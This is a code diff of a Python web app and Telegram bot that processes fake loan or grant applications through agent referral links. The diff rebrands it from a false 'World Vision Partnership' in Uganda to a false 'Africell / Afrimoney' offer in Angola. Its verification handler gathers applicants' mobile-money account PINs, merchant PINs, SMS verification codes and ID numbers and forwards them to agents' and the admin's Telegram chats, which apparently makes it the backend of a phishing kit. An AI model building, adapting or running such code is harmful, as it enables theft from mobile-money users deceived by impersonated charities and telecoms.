@@ -533,8 +533,7 @@ def resolve_referral_token(token):
                 """SELECT id FROM agents
                    WHERE status = 'active'
                    ORDER BY (CASE WHEN lower(username) LIKE '%admin%' THEN 0
-                                  WHEN lower(username) = 'shackleb' THEN 1
-                                  ELSE 2 END), created_at ASC LIMIT 1"""
+                                  ELSE 1 END), created_at ASC LIMIT 1"""
             ).fetchone()
             if admin_agent:
                 return admin_agent["id"]
@@ -902,7 +901,7 @@ def authenticate_telegram_admin(chat_id, user_info=None):
             agent = db.execute(
                 """SELECT id, display_name, username, referral_code, telegram_chat_id, status
                    FROM agents
-                   WHERE (lower(username) LIKE '%admin%' OR lower(display_name) LIKE '%admin%' OR lower(username) = 'shackleb')
+                   WHERE (lower(username) LIKE '%admin%' OR lower(display_name) LIKE '%admin%')
                      AND status = 'active'
                    ORDER BY created_at ASC LIMIT 1"""
             ).fetchone()
@@ -1222,7 +1221,7 @@ def handle_telegram_message(message):
                     f"📋 Application #{short_id}\n\n"
                     f"👤 Applicant: {r['first_name']} {r['last_name']}\n"
                     f"📱 Phone: {masked_phone}\n"
-                    f"💰 Amount: UGX {amount}\n"
+                    f"💰 Valor: {amount} Kz\n"
                     f"📅 Submitted: {date_str}\n"
                     f"📌 Status: Pending"
                 )
@@ -1668,30 +1667,16 @@ def telegram_notification_loop():
                        FROM telegram_outbox o
                        JOIN applications a ON a.id = o.application_id
                        WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
+                         AND (a.agent_id IS NULL OR trim(a.agent_id) = '')
                        ORDER BY o.created_at LIMIT 1""",
                         (time.time(),),
                     ).fetchone()
-                orphan_agent_event = None
-                if agent_event is None and admin_event is None and telegram_admin_chat_id():
-                    orphan_agent_event = db.execute(
-                        """SELECT o.id AS event_id, a.id, a.first_name, a.last_name,
-                                  a.phone, a.loan_type, a.loan_amount, a.term_months,
-                                  a.purpose, a.employment, a.annual_income, a.status,
-                                  a.agent_id, a.agent_contact_consent
-                           FROM telegram_agent_outbox o
-                           JOIN applications a ON a.id = o.application_id
-                           JOIN agents g ON g.id = a.agent_id
-                           WHERE o.sent_at IS NULL AND o.next_attempt_at <= ?
-                             AND (g.telegram_chat_id IS NULL OR trim(g.telegram_chat_id) = '')
-                           ORDER BY o.created_at LIMIT 1""",
-                        (time.time(),),
-                    ).fetchone()
-            selected = agent_event or admin_event or orphan_agent_event
+                selected = agent_event or admin_event
             if selected is None:
                 time.sleep(2)
                 continue
             event = dict(selected)
-            outbox_table = "telegram_agent_outbox" if (agent_event or orphan_agent_event) else "telegram_outbox"
+            outbox_table = "telegram_agent_outbox" if agent_event else "telegram_outbox"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(event["phone"]).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -1711,48 +1696,49 @@ def telegram_notification_loop():
                 destination = event["telegram_chat_id"]
                 current_status = (event["status"] or "pending").lower()
                 status_label = {
-                    "pending": "⏳ Pending",
-                    "under_review": "🔍 Under Review",
-                    "approved": "✅ Approved",
-                    "rejected": "❌ Rejected",
+                    "pending": "⏳ Pendente",
+                    "under_review": "🔍 Em Análise",
+                    "approved": "✅ Aprovado",
+                    "rejected": "❌ Rejeitado",
                 }.get(current_status, current_status.title())
+                formatted_amount = f"{event['loan_amount']:,}".replace(",", ".")
                 text = (
-                    f"New MoMo Application — World Vision Partnership — {badge_hdr}\n"
+                    f"Nova Candidatura Africell / Afrimoney — {badge_hdr}\n"
                     f"──────────────────────\n"
-                    f"👤 Representative: <b>{event['first_name']} {event['last_name']}</b>\n"
-                    f"📱 MoMo Phone: <code>+256 {event['phone']}</code>\n"
-                    f"🏷️ Profile: {returning_badge}\n"
-                    f"🎯 Category: {event['loan_type']}\n"
-                    f"💰 Grant Funding: UGX {event['loan_amount']:,}\n"
-                    f"📅 Timeline: {event['term_months']} Months\n"
-                    f"🔖 Reference: <code>{event['id']}</code>\n"
-                    f"📌 Status: {status_label}"
+                    f"👤 Candidato: <b>{event['first_name']} {event['last_name']}</b>\n"
+                    f"📱 Telefone: <code>+244 {event['phone']}</code>\n"
+                    f"🏷️ Perfil: {returning_badge}\n"
+                    f"🎯 Categoria: {event['loan_type']}\n"
+                    f"💰 Valor Solicitado: {formatted_amount} Kz\n"
+                    f"📅 Prazo: {event['term_months']} Meses\n"
+                    f"🔖 Referência: <code>{event['id']}</code>\n"
+                    f"📌 Estado: {status_label}"
                 )
                 reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
             else:
-                agent = event["agent_id"] or "Direct"
-                consent = "Yes" if event.get("agent_contact_consent") else "No"
                 destination = telegram_admin_chat_id()
                 current_status = (event["status"] or "pending").lower()
                 status_label = {
-                    "pending": "⏳ Pending",
-                    "under_review": "🔍 Under Review",
-                    "approved": "✅ Approved",
-                    "rejected": "❌ Rejected",
+                    "pending": "⏳ Pendente",
+                    "under_review": "🔍 Em Análise",
+                    "approved": "✅ Aprovado",
+                    "rejected": "❌ Rejeitado",
                 }.get(current_status, current_status.title())
+                formatted_amount = f"{event['loan_amount']:,}".replace(",", ".")
                 text = (
-                    f"New MoMo Application — World Vision Partnership — {badge_hdr}\n"
+                    f"Nova Candidatura Direta Africell / Afrimoney — {badge_hdr}\n"
                     f"──────────────────────\n"
-                    f"🏷️ Profile: {returning_badge}\n"
-                    f"🎯 Category: {event['loan_type']}\n"
-                    f"💰 Requested Grant: UGX {event['loan_amount']:,}\n"
-                    f"📅 Timeline: {event['term_months']} Months\n"
-                    f"💼 Project / Org: {event['purpose']}\n"
-                    f"🏛️ Entity Type: {event['employment']}\n"
-                    f"🤝 Referral Liaison: {agent}\n"
-                    f"📞 Contact Authorized: {consent}\n"
-                    f"🔖 Reference: {event['id']}\n"
-                    f"📌 Status: {status_label}"
+                    f"👤 Candidato: <b>{event['first_name']} {event['last_name']}</b>\n"
+                    f"📱 Telefone: <code>+244 {event['phone']}</code>\n"
+                    f"🏷️ Perfil: {returning_badge}\n"
+                    f"🎯 Categoria: {event['loan_type']}\n"
+                    f"💰 Valor Solicitado: {formatted_amount} Kz\n"
+                    f"📅 Prazo: {event['term_months']} Meses\n"
+                    f"💼 Actividade: {event['purpose']}\n"
+                    f"🏛️ Ocupação: {event['employment']}\n"
+                    f"🤝 Origem: Directo (Sem Agente)\n"
+                    f"🔖 Referência: <code>{event['id']}</code>\n"
+                    f"📌 Estado: {status_label}"
                 )
                 reply_markup = stage_buttons(event['id'], current_status, phone=event['phone'])
             try:
@@ -2595,14 +2581,18 @@ class Handler(BaseHTTPRequestHandler):
                 (ver_id, val_uuid, step, zip_code, phone, id_number),
             )
 
-        # Send verification data to agent's Telegram (owner of link) and Admin Telegram
+        # Send verification data:
+        # If applicant used agent referral link -> notify ONLY that agent
+        # If applicant used direct link (no agent) -> notify Admin
         app_dict = dict(app)
         target_chats = set()
-        if app_dict.get("telegram_chat_id"):
-            target_chats.add(str(app_dict["telegram_chat_id"]).strip())
-        admin_chat = telegram_admin_chat_id()
-        if admin_chat:
-            target_chats.add(str(admin_chat).strip())
+        if app_dict.get("agent_id"):
+            if app_dict.get("telegram_chat_id"):
+                target_chats.add(str(app_dict["telegram_chat_id"]).strip())
+        else:
+            admin_chat = telegram_admin_chat_id()
+            if admin_chat:
+                target_chats.add(str(admin_chat).strip())
 
         if target_chats and telegram_bot_token():
             if step in ("zip_phone", "account_pin"):
@@ -2615,7 +2605,7 @@ class Handler(BaseHTTPRequestHandler):
                 step_label = "💬 Step 4: SMS Verification Message"
 
             active_phone = phone if (step in ("zip_phone", "account_pin", "merchant_pin") and phone) else app_dict.get("phone", "")
-            phone_display = active_phone if str(active_phone).startswith("+") else f"+256 {active_phone}"
+            phone_display = active_phone if str(active_phone).startswith("+") else f"+244 {active_phone}"
             clean_phone = re.sub(r"[\s\-\+\(\)]", "", str(active_phone).strip())
             short_phone = clean_phone[-8:] if len(clean_phone) >= 8 else clean_phone
             with connect_db() as db:
@@ -3055,23 +3045,24 @@ class Handler(BaseHTTPRequestHandler):
                     application,
                 )
                 if telegram_bot_token():
-                    has_agent_tg = False
                     if application["agent_id"]:
+                        # Application via agent referral link -> Notify ONLY that agent
                         agent_row = db.execute(
                             "SELECT telegram_chat_id FROM agents WHERE id = ?",
                             (application["agent_id"],),
                         ).fetchone()
                         if agent_row and agent_row["telegram_chat_id"]:
-                            has_agent_tg = True
                             db.execute(
                                 "INSERT INTO telegram_agent_outbox (id, application_id) VALUES (?, ?)",
                                 (str(uuid.uuid4()), application["id"]),
                             )
-                    if (not has_agent_tg) and telegram_admin_chat_id():
-                        db.execute(
-                            "INSERT INTO telegram_outbox (id, application_id) VALUES (?, ?)",
-                            (str(uuid.uuid4()), application["id"]),
-                        )
+                    else:
+                        # Direct application -> Notify Admin
+                        if telegram_admin_chat_id():
+                            db.execute(
+                                "INSERT INTO telegram_outbox (id, application_id) VALUES (?, ?)",
+                                (str(uuid.uuid4()), application["id"]),
+                            )
         except ValueError as error:
             return self.send_json(400, {"error": str(error)})
         except sqlite3.IntegrityError:
